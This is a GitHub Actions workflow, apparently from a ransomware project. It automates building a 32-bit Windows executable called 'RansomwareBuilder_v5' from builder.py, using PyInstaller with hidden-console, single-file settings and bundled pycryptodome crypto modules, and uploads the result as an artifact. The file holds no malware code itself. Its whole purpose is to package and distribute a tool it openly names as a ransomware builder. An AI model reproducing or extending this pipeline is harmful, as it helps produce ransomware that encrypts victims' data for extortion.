name: Build Ransomware Builder v5.0 (32-bit)

on:
  push:
    branches: [ main ]
  workflow_dispatch:

jobs:
  build:
    runs-on: windows-latest
    
    steps:
    - name: Checkout
      uses: actions/checkout@v4
      
    - name: Setup Python
      uses: actions/setup-python@v5
      with:
        python-version: '3.11'
        architecture: 'x86'
        
    - name: Install dependencies
      run: |
        pip install pyinstaller pycryptodome pillow
        
    - name: Build Builder (32-bit, optimized)
      run: |
        pyinstaller --onefile --noconsole --name "RansomwareBuilder_v5" `
          --hidden-import PyInstaller `
          --hidden-import Crypto `
          --hidden-import Crypto.Cipher `
          --hidden-import Crypto.PublicKey `
          --hidden-import Crypto.Util `
          --collect-all Crypto `
          --collect-all pycryptodome `
          --log-level WARN `
          builder.py
        
    - name: Upload Builder EXE
      uses: actions/upload-artifact@v4
      with:
        name: RansomwareBuilder_v5
        path: dist/RansomwareBuilder_v5.exe
